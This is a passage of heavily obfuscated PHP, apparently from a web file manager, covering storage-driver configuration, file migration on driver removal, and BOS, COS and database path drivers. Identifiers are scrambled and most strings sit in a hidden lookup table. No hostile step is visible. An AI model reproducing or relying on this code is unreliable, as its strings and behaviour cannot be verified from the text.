$Ê†ËºÙŸ[$·’™·É‚[32]]; $îõ‹æ¦Ù = array_to_keyvalue(parent::listData(), $·’™·É‚[32]); if (isset($îõ‹æ¦Ù[$„î…“­³]) && $îõ‹æ¦Ù[$„î…“­³][$·’™·É‚[478]] != $ì—„Ã¢³) { return !1; } $this->checkPwd($ì—„Ã¢³, $Ê†ËºÙŸ); if (isset($Ê†ËºÙŸ[$·’™·É‚[2327]]) && $Ê†ËºÙŸ[$·’™·É‚[2327]] == $·’™·É‚[91]) { $this->checkConfig($Ê†ËºÙŸ); } unset($Ê†ËºÙŸ[$·’™·É‚[2327]]); $ÓíÔ¶ç˜ = parent::update($ì—„Ã¢³, $Ê†ËºÙŸ); if ($ÓíÔ¶ç˜ && $Ê†ËºÙŸ[$·’™·É‚[37]]) { $ü³ıÌğŸ = 0; foreach ($îõ‹æ¦Ù as $Ç“×„Ôˆ) { if ($Ç“×„Ôˆ[$·’™·É‚[37]] && $Ç“×„Ôˆ[$·’™·É‚[478]] != $ì—„Ã¢³) { $ü³ıÌğŸ = $Ç“×„Ôˆ[$·’™·É‚[478]]; parent::update($Ç“×„Ôˆ[$·’™·É‚[478]], array($·’™·É‚[37] => 0)); } } $this->updateBackup($ì—„Ã¢³, $ü³ıÌğŸ); } return $ÓíÔ¶ç˜; } public function add($¾Õ¨ƒ—™) { $ò‹òó“ =& $_SERVER[«òÑğ]; $™Ì˜–ìÖ = array_to_keyvalue(parent::listData(), $ò‹òó“[32]); if (isset($™Ì˜–ìÖ[$¾Õ¨ƒ—™[$ò‹òó“[32]]])) { return !1; } $this->checkConfig($¾Õ¨ƒ—™); $áÕ»®× = parent::insert($¾Õ¨ƒ—™); if ($áÕ»®× && $¾Õ¨ƒ—™[$ò‹òó“[37]]) { foreach ($™Ì˜–ìÖ as $Ş…âáñã) { if ($Ş…âáñã[$ò‹òó“[37]]) { parent::update($Ş…âáñã[$ò‹òó“[478]], array($ò‹òó“[37] => 0)); } } } return $áÕ»®×; } public function updateBackup($™ùì•­, $„ş‹¿€) { $ç­´öÈÑ =& $_SERVER[«òÑğ]; if (!$„ş‹¿€) { return; } $Ò ‡™™¨ = Model($ç­´öÈÑ[832])->config(); if ($Ò ‡™™¨[$ç­´öÈÑ[1753]] != $ç­´öÈÑ[91] || $Ò ‡™™¨[$ç­´öÈÑ[836]] != $„ş‹¿€) { return; } $Òòø·Øâ = Model($ç­´öÈÑ[854])->get($ç­´öÈÑ[861]); $Òòø·Øâ = json_decode($Òòø·Øâ, !0); if (!$Òòø·Øâ) { return; } $Òòø·Øâ[$ç­´öÈÑ[836]] = $™ùì•­; Model($ç­´öÈÑ[854])->set(array($ç­´öÈÑ[861] => $Òòø·Øâ)); } public function checkPwd($ĞßŞƒà, &$÷Ùãê¢¾) { $°íÜ±‚Â =& $_SERVER[«òÑğ]; if (empty($÷Ùãê¢¾[$°íÜ±‚Â[6]])) { return; } $¹¦Ä†Úì = $÷Ùãê¢¾[$°íÜ±‚Â[6]]; if (!is_array($¹¦Ä†Úì)) { $¹¦Ä†Úì = json_decode($¹¦Ä†Úì, !0); } $óÊˆ†™Š = $°íÜ±‚Â[12]; $Øˆ±üÓ = array($°íÜ±‚Â[2328], $°íÜ±‚Â[2329], $°íÜ±‚Â[976]); foreach ($Øˆ±üÓ as $ê´ĞÌı) { if (isset($¹¦Ä†Úì[$ê´ĞÌı])) { $óÊˆ†™Š = $ê´ĞÌı; break; } } if (!$óÊˆ†™Š) { return; } $§‘¥åâ® = $this->getConfig($ĞßŞƒà); $ê¼‡Í‡Ö = $§‘¥åâ®[$óÊˆ†™Š]; $§ÒË¼›ç = $¹¦Ä†Úì[$óÊˆ†™Š]; if ($§ÒË¼›ç == str_repeat($°íÜ±‚Â[223], strlen($ê¼‡Í‡Ö))) { $¹¦Ä†Úì[$óÊˆ†™Š] = $ê¼‡Í‡Ö; $÷Ùãê¢¾[$°íÜ±‚Â[6]] = json_encode($¹¦Ä†Úì); } else { if ($§ÒË¼›ç != $ê¼‡Í‡Ö) { $÷Ùãê¢¾[$°íÜ±‚Â[2327]] = $°íÜ±‚Â[91]; } } } public function checkConfig(&$¬³„şºÁ, $¸æ¥··Ù = false) { $¢åÏıÂ =& $_SERVER[«òÑğ]; $®çÈì¸ = strtolower($¬³„şºÁ[$¢åÏıÂ[98]]); $‹ÛÑáª¾ = $¬³„şºÁ[$¢åÏıÂ[6]]; if (!is_array($‹ÛÑáª¾)) { $‹ÛÑáª¾ = json_decode($‹ÛÑáª¾, !0); } foreach ($‹ÛÑáª¾ as $¹û±Øç® => $şéõå›) { if (is_string($şéõå›)) { $‹ÛÑáª¾[$¹û±Øç®] = trim($şéõå›); } } $‹ÛÑáª¾[$¢åÏıÂ[2330]] = rand_string(6); $€Ÿ†®Ê® = $GLOBALS[$¢åÏıÂ[6]][$¢åÏıÂ[92]][$¢åÏıÂ[915]]; $Åå—ø¿ = isset($€Ÿ†®Ê®[$®çÈì¸]) ? $€Ÿ†®Ê®[$®çÈì¸] : ucfirst($®çÈì¸); $¬¤Çë÷ı = $¢åÏıÂ[77] . $Åå—ø¿; if (!$Åå—ø¿ || !class_exists($¬¤Çë÷ı)) { if ($¸æ¥··Ù) { return LNG($¢åÏıÂ[2331]); } write_log(array($¢åÏıÂ[2332], $¬³„şºÁ, get_caller_info()), $¢åÏıÂ[216]); show_json(LNG($¢åÏıÂ[2331]), !1, $¬³„şºÁ); } $ŒíÕÎ… = new $¬¤Çë÷ı($‹ÛÑáª¾); $ü‰½È­ = rtrim($‹ÛÑáª¾[$¢åÏıÂ[1272]], $¢åÏıÂ[8]) . $¢åÏıÂ[8]; if (in_array($®çÈì¸, $ŒíÕÎ…->objectDriver)) { try { if (!$ŒíÕÎ…->isBucketCors() && !$ŒíÕÎ…->setBucketCors()) { $¨ª»úÖ = LNG($¢åÏıÂ[2333]); $¨ª»úÖ .= $¢åÏıÂ[2334] . LNG($¢åÏıÂ[2335]); } } catch (Exception $ıºßˆŠÈ) { $¨ª»úÖ = $ıºßˆŠÈ->getMessage(); } if (isset($¨ª»úÖ)) { return $this->_parseError($¨ª»úÖ, $®çÈì¸, $¸æ¥··Ù); } if ($®çÈì¸ == $¢åÏıÂ[68] && !$ŒíÕÎ…->checkRegion()) { return $this->_parseError(LNG($¢åÏıÂ[2336]), $®çÈì¸, $¸æ¥··Ù); } } else { if ($®çÈì¸ == $¢åÏıÂ[2337]) { if ($ŒíÕÎ…->ftpPath) { $ßÙ ÜÉë = trim($ü‰½È­, $¢åÏıÂ[8]); if (stripos($ßÙ ÜÉë, trim($ŒíÕÎ…->ftpPath, $¢åÏıÂ[8])) !== 0) { $ü‰½È­ = $ŒíÕÎ…->ftpPath . $¢åÏıÂ[8] . ($ßÙ ÜÉë ? $ßÙ ÜÉë . $¢åÏıÂ[8] : $¢åÏıÂ[12]); } } } } $Ää‡É­û = $ŒíÕÎ…->getPath($ü‰½È­ . $¢åÏıÂ[1276]); try { if ($®çÈì¸ == $¢åÏıÂ[109]) { $ŒíÕÎ…->mkdir($ü‰½È­); } $›ğ€Ş‚È = $ŒíÕÎ…->mkfile($Ää‡É­û); if (!$›ğ€Ş‚È) { $¨ª»úÖ = LNG($¢åÏıÂ[2333]); } } catch (Exception $ıºßˆŠÈ) { $¨ª»úÖ = $ıºßˆŠÈ->getMessage(); } if (isset($¨ª»úÖ)) { return $this->_parseError($¨ª»úÖ, $®çÈì¸, $¸æ¥··Ù); } $‹ÛÑáª¾[$¢åÏıÂ[1272]] = $ü‰½È­; $¬³„şºÁ[$¢åÏıÂ[6]] = json_encode($‹ÛÑáª¾); $¬³„şºÁ[$¢åÏıÂ[98]] = $Åå—ø¿; return !0; } private function _parseError($´Æ’Ì¤•, $ù¶ÄÎûİ, $æçß’óÀ = false) { $Ô•éôˆ =& $_SERVER[«òÑğ]; if ($ù¶ÄÎûİ == $Ô•éôˆ[68] && stripos($´Æ’Ì¤•, $Ô•éôˆ[2338])) { $Óï·š‰Ø = explode($Ô•éôˆ[10], $´Æ’Ì¤•); $Š»¥É¬… = isset($Óï·š‰Ø[1]) ? $Óï·š‰Ø[1] : $Ô•éôˆ[12]; $“Ïı«‹è = array($Ô•éôˆ[2339] => LNG($Ô•éôˆ[2340]), $Ô•éôˆ[2341] => LNG($Ô•éôˆ[2342])); if (isset($“Ïı«‹è[$Š»¥É¬…])) { $´Æ’Ì¤• = $“Ïı«‹è[$Š»¥É¬…]; } } if (stripos($´Æ’Ì¤•, $Ô•éôˆ[2343]) === 0) { $ö¡Óéü· = strpos($´Æ’Ì¤•, $Ô•éôˆ[178]); if ($ö¡Óéü· === !1) { $ö¡Óéü· = strpos($´Æ’Ì¤•, $Ô•éôˆ[4]); } if ($ö¡Óéü· !== !1) { $´Æ’Ì¤• = substr($´Æ’Ì¤•, $ö¡Óéü· + 1); } } $´Æ’Ì¤• = LNG($Ô•éôˆ[1279]) . $´Æ’Ì¤•; if ($æçß’óÀ) { return $´Æ’Ì¤•; } show_json($´Æ’Ì¤•, !1); } public function driverListSystem() { $Òµ›ŒÓî =& $_SERVER[«òÑğ]; $‡‰¢ËËä = parent::listData(); $¢üá¸… = array(); foreach ($‡‰¢ËËä as $æ´Ï¨Ë‰) { unset($æ´Ï¨Ë‰[$Òµ›ŒÓî[234]], $æ´Ï¨Ë‰[$Òµ›ŒÓî[88]]); if (!is_array($æ´Ï¨Ë‰[$Òµ›ŒÓî[6]])) { $æ´Ï¨Ë‰[$Òµ›ŒÓî[6]] = json_decode($æ´Ï¨Ë‰[$Òµ›ŒÓî[6]], !0); } $¢üá¸…[] = $æ´Ï¨Ë‰; } return $¢üá¸…; } public function defaultDriver() { $€º¦ï§¸ =& $_SERVER[«òÑğ]; $ı²‰öË = parent::listData(); $Â”Õóë„ = array_filter_by_field($ı²‰öË, $€º¦ï§¸[37], 1); $Â”Õóë„ = $Â”Õóë„[0]; if (!$Â”Õóë„) { return array(); } if (!is_array($Â”Õóë„[$€º¦ï§¸[6]])) { $Â”Õóë„[$€º¦ï§¸[6]] = json_decode($Â”Õóë„[$€º¦ï§¸[6]], !0); } return $Â”Õóë„; } public function driverInfo($ú¤±ĞÍ) { $€öÖŒÄš =& $_SERVER[«òÑğ]; $¯¬²ëí³ = array_to_keyvalue(parent::listData(), $€öÖŒÄš[478]); if (!isset($¯¬²ëí³[$ú¤±ĞÍ])) { return !1; } $°€Ú¶í– = $¯¬²ëí³[$ú¤±ĞÍ]; if (!is_array($°€Ú¶í–[$€öÖŒÄš[6]])) { $°€Ú¶í–[$€öÖŒÄš[6]] = json_decode($°€Ú¶í–[$€öÖŒÄš[6]], !0); } return $°€Ú¶í–; } public function remove($Ößê¿†») { $this->removeShareItems($Ößê¿†»); return parent::remove($Ößê¿†»); } public function removeWithFile($ÖÈ°Öğù, $âØÍö‰Æ, $—¢Â½ü , $öæ ¨ä± = false) { $ñ¼˜øôÃ =& $_SERVER[«òÑğ]; $Šä†‘«ñ = array($ñ¼˜øôÃ[907] => $ÖÈ°Öğù); $ƒ‹Ï±´¬ = Model($ñ¼˜øôÃ[549])->where($Šä†‘«ñ)->count(); $µù¦Ü–´ = Model($ñ¼˜øôÃ[549])->where($Šä†‘«ñ)->sum($ñ¼˜øôÃ[79]); $òƒ­§  = $âØÍö‰Æ . $ñ¼˜øôÃ[2344] . $ÖÈ°Öğù; $©ˆ×–† = LNG($âØÍö‰Æ == $ñ¼˜øôÃ[628] ? $ñ¼˜øôÃ[2345] : $ñ¼˜øôÃ[2346]); $÷«ì«ïÀ = new TaskFileTransfer($òƒ­§ , $ñ¼˜øôÃ[216], $ƒ‹Ï±´¬, $©ˆ×–† . $ñ¼˜øôÃ[465] . $—¢Â½ü [$ñ¼˜øôÃ[32]] . $ñ¼˜øôÃ[215] . $ÖÈ°Öğù); $÷«ì«ïÀ->task[$ñ¼˜øôÃ[847]] = (double) $µù¦Ü–´; $Ú€ñ”Š’ = KodIO::defaultDriver(); $Ôï‹Ğğø = $Ú€ñ”Š’[$ñ¼˜øôÃ[478]]; $ö…ïÅÖ¸ = $ı©ÉÒŸö = $ÚÛ¾†¢æ = array(); $ìÁÄüŠÜ = Model($ñ¼˜øôÃ[233])->where($Šä†‘«ñ)->field($ñ¼˜øôÃ[2347])->select(); foreach ($ìÁÄüŠÜ as $ÃÙ¹§ÅÄ) { $÷‰áïëˆ = $ÃÙ¹§ÅÄ[$ñ¼˜øôÃ[546]]; if ($öæ ¨ä±) { $ı©ÉÒŸö[] = $÷‰áïëˆ; continue; } $Îú¥ÍÕ± = $ÃÙ¹§ÅÄ[$ñ¼˜øôÃ[87]]; $í¯‰ôÒı = get_path_father($Îú¥ÍÕ±); $ÚÛ¾†¢æ[] = $í¯‰ôÒı; $í¯‰ôÒı = str_replace("\173\151\157\72{$ÖÈ°Öğù}\175\57", "\173\151\157\72{$Ôï‹Ğğø}\x7d\57", $í¯‰ôÒı); if (!IO::exist($Îú¥ÍÕ±)) { $ö…ïÅÖ¸[] = $÷‰áïëˆ; $÷«ì«ïÀ->updateFileEnd($ÃÙ¹§ÅÄ[$ñ¼˜øôÃ[32]], $ÃÙ¹§ÅÄ[$ñ¼˜øôÃ[79]]); write_log($ñ¼˜øôÃ[2348] . $Îú¥ÍÕ±, $ñ¼˜øôÃ[1916]); continue; } $àé·Åâë = IO::move($Îú¥ÍÕ±, $í¯‰ôÒı, REPEAT_RENAME); if (!$àé·Åâë) { $ı©ÉÒŸö[] = $÷‰áïëˆ; $÷«ì«ïÀ->updateFileEnd($ÃÙ¹§ÅÄ[$ñ¼˜øôÃ[32]], $ÃÙ¹§ÅÄ[$ñ¼˜øôÃ[79]]); write_log($ñ¼˜øôÃ[2349] . $Îú¥ÍÕ±, $ñ¼˜øôÃ[1916]); continue; } $Šä†‘«ñ = array($ñ¼˜øôÃ[546] => $÷‰áïëˆ); $€¯¢Èğ = array($ñ¼˜øôÃ[907] => $Ôï‹Ğğø, $ñ¼˜øôÃ[87] => $àé·Åâë); Model($ñ¼˜øôÃ[233])->where($Šä†‘«ñ)->save($€¯¢Èğ); } $ÊùŞö¯Œ = $÷«ì«ïÀ->task; if (!$öæ ¨ä±) { Cache::set($òƒ­§ , $ÊùŞö¯Œ); } $÷«ì«ïÀ->end(); $ö…ïÅÖ¸ = array_unique($ö…ïÅÖ¸); $ı©ÉÒŸö = array_unique($ı©ÉÒŸö); if (!$öæ ¨ä± && ($ö…ïÅÖ¸ || $ı©ÉÒŸö)) { $Û¢İ×Ñ = array(); if ($ö…ïÅÖ¸) { $Û¢İ×Ñ[] = sprintf(LNG($ñ¼˜øôÃ[2350]), count($ö…ïÅÖ¸)); } if ($ı©ÉÒŸö) { $Û¢İ×Ñ[] = sprintf(LNG($ñ¼˜øôÃ[2351]), count($ı©ÉÒŸö)); } $Û¢İ×Ñ = sprintf(LNG($ñ¼˜øôÃ[2352]), implode($ñ¼˜øôÃ[2353], $Û¢İ×Ñ)) . $ñ¼˜øôÃ[2354] . date($ñ¼˜øôÃ[2355]) . $ñ¼˜øôÃ[2356]; if ($âØÍö‰Æ == $ñ¼˜øôÃ[1953]) { $Û¢İ×Ñ .= $ñ¼˜øôÃ[2357] . LNG($ñ¼˜øôÃ[2358]); } else { $Û¢İ×Ñ = LNG($ñ¼˜øôÃ[2359]) . $ñ¼˜øôÃ[2360] . $Û¢İ×Ñ; } $ÊùŞö¯Œ[$ñ¼˜øôÃ[1274]] = $Û¢İ×Ñ; Cache::set($òƒ­§ , $ÊùŞö¯Œ); unset($—¢Â½ü [$ñ¼˜øôÃ[6]]); $ŠøÆğ = array($ñ¼˜øôÃ[478] => $ÖÈ°Öğù, $ñ¼˜øôÃ[2227] => $ñ¼˜øôÃ[628], $ñ¼˜øôÃ[32] => $—¢Â½ü [$ñ¼˜øôÃ[32]], $ñ¼˜øôÃ[98] => $—¢Â½ü [$ñ¼˜øôÃ[98]]); Hook::trigger($ñ¼˜øôÃ[1795], array($ñ¼˜øôÃ[1297] => $ŠøÆğ, $ñ¼˜øôÃ[1307] => !0)); show_json($Û¢İ×Ñ, !1, 100111); } if ($âØÍö‰Æ == $ñ¼˜øôÃ[628]) { return !0; } if ($ö…ïÅÖ¸ || $ı©ÉÒŸö) { $Ş†ı‘æÆ = array_merge($ö…ïÅÖ¸, $ı©ÉÒŸö); $Ş†ı‘æÆ = array_filter(array_unique($Ş†ı‘æÆ)); $this->removeByFileID($Ş†ı‘æÆ); } if ($ÚÛ¾†¢æ) { $ÚÛ¾†¢æ = array_filter(array_unique($ÚÛ¾†¢æ)); foreach ($ÚÛ¾†¢æ as $Îú¥ÍÕ±) { $íÍ»½¤ = IO::has($Îú¥ÍÕ±, !0); if (!$íÍ»½¤[$ñ¼˜øôÃ[242]] && !$íÍ»½¤[$ñ¼˜øôÃ[243]]) { IO::remove($Îú¥ÍÕ±); } } } return $this->remove($ÖÈ°Öğù); } private function removeByFileID($ò›¬ªÓÅ = array()) { $ÀÀ™öİ =& $_SERVER[«òÑğ]; if (empty($ò›¬ªÓÅ)) { return; } $÷í•¢ñ = array($ÀÀ™öİ[546] => array($ÀÀ™öİ[7], $ò›¬ªÓÅ)); $Ã±éÊâ = Model($ÀÀ™öİ[1431])->where($÷í•¢ñ)->field($ÀÀ™öİ[194])->select(); if (!$Ã±éÊâ) { return Model($ÀÀ™öİ[549])->remove($ò›¬ªÓÅ); } $Ã±éÊâ = array_to_keyvalue($Ã±éÊâ, $ÀÀ™öİ[12], $ÀÀ™öİ[194]); foreach ($Ã±éÊâ as $ƒÖº›ÌÑ) { Model($ÀÀ™öİ[914])->removeNow($ƒÖº›ÌÑ, !1); } } private function removeShareItems($ªúÏ) { $¸ıäÃ²‡ =& $_SERVER[«òÑğ]; $÷Â‡‚î = "\173\x69\x6f\x3a{$ªúÏ}\175\x2f"; $Äâö®§© = array($¸ıäÃ²‡[194] => 0, $¸ıäÃ²‡[1267] => array($¸ıäÃ²‡[462], "{$÷Â‡‚î}\x25")); $ŒÙœó¿Ì = Model($¸ıäÃ²‡[1964])->where($Äâö®§©)->field($¸ıäÃ²‡[673])->select(); if (empty($ŒÙœó¿Ì)) { return; } $¶âÃ…” = array_to_keyvalue($ŒÙœó¿Ì, $¸ıäÃ²‡[12], $¸ıäÃ²‡[673]); Model($¸ıäÃ²‡[672])->remove($¶âÃ…”); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\x6d\56\x4c\x69\147\150\x74\101\x70\x70"; public $modelType = "\123\171\163\x74\145\x6d\x4f\160\x74\151\157\156"; public $field = array("\156\141\155\x65", "\147\x72\157\165\160", "\x64\x65\x73\143", "\x63\x6f\156\x74\x65\x6e\164"); public function listData($ĞŞÀ—å¡ = false, $Ú¾ç×È = "\x6d\157\x64\x69\146\x79\124\x69\155\x65", $å‡ÑËÈ¦ = true) { return parent::listData($ĞŞÀ—å¡, $Ú¾ç×È, $å‡ÑËÈ¦); } public function remove($•ÙêêŠ) { $Ğ¿µ×àş = $this->findByName($•ÙêêŠ); if (!$Ğ¿µ×àş) { return !1; } return parent::remove($Ğ¿µ×àş[$_SERVER[«òÑğ][478]]); } public function add($Ôã‹ß­) { if ($this->findByName($Ôã‹ß­[$_SERVER[«òÑğ][32]])) { return !1; } return parent::insert($Ôã‹ß­); } public function update($¡÷·’’, $ôáÑò) { $êí¼©Ö =& $_SERVER[«òÑğ]; $ü§Ù¶á© = $this->findByName($¡÷·’’); $ íó¹‡ = $this->findByName($ôáÑò[$êí¼©Ö[32]]); if (!$ü§Ù¶á© || $ íó¹‡ && $ íó¹‡[$êí¼©Ö[478]] != $ü§Ù¶á©[$êí¼©Ö[478]]) { return !1; } return parent::update($ü§Ù¶á©[$êí¼©Ö[478]], $ôáÑò); } } goto DªéÙ“¼º²; a¯Á—óõÇã: class PathDriverBOS extends PathDriverS3 { public function __construct($Èƒ·âıç) { parent::__construct($Èƒ·âıç); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function fileOutLink($ü§¡‚Ñ ) { $ó€¿ÎÀ¸ =& $_SERVER[«òÑğ]; if (substr($ü§¡‚Ñ , 0, 7) == $ó€¿ÎÀ¸[219]) { $ü§¡‚Ñ  = $ó€¿ÎÀ¸[220] . substr($ü§¡‚Ñ , 7); } header($ó€¿ÎÀ¸[175] . $ü§¡‚Ñ ); die; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($úà¶ûóÈ) { parent::__construct($úà¶ûóÈ); $this->setSignVersion($_SERVER[«òÑğ][250]); } public function uploadFormData($Úã§ËÁõ, $±½¥ÂË˜ = 3600) { $éöş“Ùë =& $_SERVER[«òÑğ]; $Ş›ê•üé = $éöş“Ùë[232]; $ÖòúáÕû = $éöş“Ùë[1422]; $ÌíÁ‰üÍ = $éöş“Ùë[264]; $ˆŸ»àï = gmdate($éöş“Ùë[1423], time() + $±½¥ÂË˜); $ƒòÒ÷’ = (string) time() . $éöş“Ùë[74] . (string) (time() + $±½¥ÂË˜); $ï¡ó„†¦ = array($éöş“Ùë[265] => $ˆŸ»àï, $éöş“Ùë[268] => array(array($éöş“Ùë[309] => $Ş›ê•üé), array($éöş“Ùë[269] => $this->bucket), array($éöş“Ùë[270], $éöş“Ùë[271], $éöş“Ùë[12]), array($éöş“Ùë[273] => $ÌíÁ‰üÍ), array($éöş“Ùë[1424] => $ÖòúáÕû), array($éöş“Ùë[1425] => $this->accessKey), array($éöş“Ùë[1426] => $ƒòÒ÷’))); $ï¡ó„†¦ = json_encode($ï¡ó„†¦); $İª·®„Á = hash_hmac($éöş“Ùë[1422], $ƒòÒ÷’, $this->secret); $„ÀÂ¬‚ö = sha1($ï¡ó„†¦); $˜§·¿–° = hash_hmac($éöş“Ùë[1422], $„ÀÂ¬‚ö, $İª·®„Á); $ÚéÅúê™ = array($éöş“Ùë[309] => $Ş›ê•üé, $éöş“Ùë[273] => $ÌíÁ‰üÍ, $éöş“Ùë[280] => base64_encode($ï¡ó„†¦), $éöş“Ùë[1424] => $ÖòúáÕû, $éöş“Ùë[1425] => $this->accessKey, $éöş“Ùë[1427] => $ƒòÒ÷’, $éöş“Ùë[1428] => $˜§·¿–°, $éöş“Ùë[209] => $this->getHost()); return $ÚéÅúê™; } public function fileOutImage($ŒÑ¬¦¢ô, $À· Õ²Ì = 250) { $¾¡”š×˜ =& $_SERVER[«òÑğ]; if ($this->size($ŒÑ¬¦¢ô) > 1024 * 1024 * 32) { return $this->fileOutImageServer($ŒÑ¬¦¢ô, $À· Õ²Ì); } $âÓ¼¨Ì¹ = $this->link($ŒÑ¬¦¢ô); $âÓ¼¨Ì¹ .= $¾¡”š×˜[1429] . $À· Õ²Ì . $¾¡”š×˜[1430]; $this->fileOutLink($âÓ¼¨Ì¹); } public function fileOutLink($õñœ¼ù) { $îåé©õŒ =& $_SERVER[«òÑğ]; if (substr($õñœ¼ù, 0, 7) == $îåé©õŒ[219]) { $õñœ¼ù = $îåé©õŒ[220] . substr($õñœ¼ù, 7); } header($îåé©õŒ[175] . $õñœ¼ù); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($Š©Î……‹) { $this->pathParse = $Š©Î……‹; $this->model = Model($_SERVER[«òÑğ][1431]); } public function getPath($ˆ–ÉíÀ) { return trim($ˆ–ÉíÀ, $_SERVER[«òÑğ][8]); } public function pathFather($ò•áª¡) { $¸úËİ»à = $this->parse($ò•áª¡); $¸úËİ»à = $this->infoSimple($ò•áª¡); return $¸úËİ»à ? $¸úËİ»à[$_SERVER[«òÑğ][193]] : !1; } public function pathThis($ş«…’Í) { $ıÑ¢‰ = $this->infoSimple($ş«…’Í); return $ıÑ¢‰ ? $ıÑ¢‰[$_SERVER[«òÑğ][32]] : !1; } public function getPathOuter($Šğ’ª¥ß) { if (!$Šğ’ª¥ß) { return $Šğ’ª¥ß; } $‰ëõø–… = $this->parse($Šğ’ª¥ß); return KodIO::make($‰ëõø–…[$_SERVER[«òÑğ][478]]); } public function copyFolderFromIO($­ş–ëÂ, $Ó¿‡Šû—, $ÆüŞá××, $È®·ƒíî, $íÌÖ„·¶) { $ğà¹ã¶ = $this->model->copyFolderFromIO($­ş–ëÂ, $Ó¿‡Šû—, $ÆüŞá××, $È®·ƒíî, $íÌÖ„·¶); return KodIO::make($ğà¹ã¶); } public function isParentOf($üîûĞ÷¬, $ñèëº’±) { return $this->model->isParentOf($üîûĞ÷¬, $ñèëº’±); } public function mkfile($¡¯¹Ùçı, $Ïî†ü½Ó = '', $€‡ÍÑı = REPEAT_RENAME) { $õç£Ç¦× =& $_SERVER[«òÑğ]; $¤êØåë = $this->parse($¡¯¹Ùçı); $¡¯¹Ùçı = $¤êØåë[$õç£Ç¦×[478]]; for ($ÃˆïÄ€ = 0; $ÃˆïÄ€ < count($¤êØåë[$õç£Ç¦×[1432]]); $ÃˆïÄ€++) { $ãÏ˜´ÌÜ = $¤êØåë[$õç£Ç¦×[1432]][$ÃˆïÄ€]; if ($ÃˆïÄ€ == count($¤êØåë[$õç£Ç¦×[1432]]) - 1) { $¡¯¹Ùçı = $this->model->mkfile($¡¯¹Ùçı, $ãÏ˜´ÌÜ, $Ïî†ü½Ó, $€‡ÍÑı); break; } $¡¯¹Ùçı = $this->model->mkdir($¡¯¹Ùçı, $ãÏ˜´ÌÜ, REPEAT_SKIP); } return $this->getPathOuter($¡¯¹Ùçı); } public function mkdir($ÎÈá‡óÀ, $ìßàÈûº = REPEAT_SKIP) { $ÒÛœÆüÛ =& $_SERVER[«òÑğ]; $¯’íÁÅÔ = $this->parse($ÎÈá‡óÀ); $ÎÈá‡óÀ = $¯’íÁÅÔ[$ÒÛœÆüÛ[478]]; for ($¯íÆ¤ÑÅ = 0; $¯íÆ¤ÑÅ < count($¯’íÁÅÔ[$ÒÛœÆüÛ[1432]]); $¯íÆ¤ÑÅ++) { $µ”¹´§Ï = $¯’íÁÅÔ[$ÒÛœÆüÛ[1432]][$¯íÆ¤ÑÅ]; $ÎÈá‡óÀ = $this->model->mkdir($ÎÈá‡óÀ, $µ”¹´§Ï, $ìßàÈûº); } return $this->getPathOuter($ÎÈá‡óÀ); } public function copyFile($°ïêÒæ, $Œ»—¸›İ, $òÔşÎé‚ = REPEAT_REPLACE) { $ÇàŒ±ñ =& $_SERVER[«òÑğ]; $éû‘ã Š = $this->parse($Œ»—¸›İ); $…—¦½Ì£ = $this->model->copy($°ïêÒæ, $éû‘ã Š[$ÇàŒ±ñ[478]], $òÔşÎé‚, $éû‘ã Š[$ÇàŒ±ñ[87]]); return $…—¦½Ì£ ? $this->getPathOuter($…—¦½Ì£) : !1; } public function moveFile($¯ÔÆ‰ß¦, $³×Èúø, $·÷Ÿ“Œñ = REPEAT_REPLACE) { $óÉÄ¦÷ =& $_SERVER[«òÑğ]; $ÃœçÛÁ„ = $this->parse($³×Èúø); $É¿ÌÈß = $this->model->move($¯ÔÆ‰ß¦, $ÃœçÛÁ„[$óÉÄ¦÷[478]], $·÷Ÿ“Œñ, $ÃœçÛÁ„[$óÉÄ¦÷[87]]); return $É¿ÌÈß ? $this->getPathOuter($É¿ÌÈß) : !1; } public function copy($ÙÈÕ¤†Ô, $Ÿ…ıó, $¤´¨è¨ = REPEAT_REPLACE, $¼°¥Í˜° = false) { $öÒ¦«ßõ = $this->parse($Ÿ…ıó); $ƒÜšúû¤ = $this->model->copy($ÙÈÕ¤†Ô, $öÒ¦«ßõ[$_SERVER[«òÑğ][478]], $¤´¨è¨, $¼°¥Í˜°); return $ƒÜšúû¤ ? $this->getPathOuter($ƒÜšúû¤) : !1; } public function moveSameAllow() { } public function move($²§ø’ıÔ, $ì‚©†ıò, $Âá¨µ™° = REPEAT_REPLACE, $»ïÃ­¸ç = false) { $îÂÃ¯ô = $this->parse($ì‚©†ıò); $ß›ë¸‘ = $this->model->move($²§ø’ıÔ, $îÂÃ¯ô[$_SERVER[«òÑğ][478]], $Âá¨µ™°, $»ïÃ­¸ç); return $ß›ë¸‘ ? $this->getPathOuter($ß›ë¸‘) : !1; } public function remove($º¡ò÷÷¥, $áéÉ¶Íë = true) { return $this->model->remove($º¡ò÷÷¥, $áéÉ¶Íë); } public function rename($‚èÌ®—¨, $½…Ü¾Èü) { $×ª¥øÃ = $this->model->rename($‚èÌ®—¨, $½…Ü¾Èü); return $×ª¥øÃ ? $this->getPathOuter($‚èÌ®—¨) : $×ª¥øÃ; } public function size($ÛÁªòü) { $ÑÜêê = $this->infoSimple($ÛÁªòü); return $ÑÜêê ? $ÑÜêê[$_SERVER[«òÑğ][79]] : 0; } public function infoSimple($ÍŒáúã­) { return $this->model->sourceInfo($ÍŒáúã­); } public function info($È¯ÓÅ«) { return $this->infoParse($È¯ÓÅ«); } public function infoAuth($ó»íªÒ) { return $this->infoParse($ó»íªÒ, !1, !0); } public function infoWithChildren($‘àşŒ¡†) { return $this->infoParse($‘àşŒ¡†, !0); } protected function infoParse($—˜«’îû, $Â¡€ñšÉ = false, $¸«§ßº™ = false) { if (!$Â¡€ñšÉ) { return $this->model->pathInfo($—˜«’îû, $¸«§ßº™); } return $this->model->pathInfoMore($—˜«’îû); } public function infoFullSimple($ÄüÔ«º„) { $ÈÜ™èÇ¶ =& $_SERVER[«òÑğ]; $È ¡Õî­ = explode($ÈÜ™èÇ¶[8], $ÄüÔ«º„); $×÷÷áŸ = implode($ÈÜ™èÇ¶[8], array_splice($È ¡Õî­, 1)); return $this->model->pathInfoByPath($È ¡Õî­[0], $×÷÷áŸ); } public function infoFull($³¯ñ½æí) { $ìÌÒàù¾ = $this->infoFullSimple($³¯ñ½æí); return is_array($ìÌÒàù¾) ? $this->model->pathInfo($ìÌÒàù¾[$_SERVER[«òÑğ][194]]) : !1; } public function 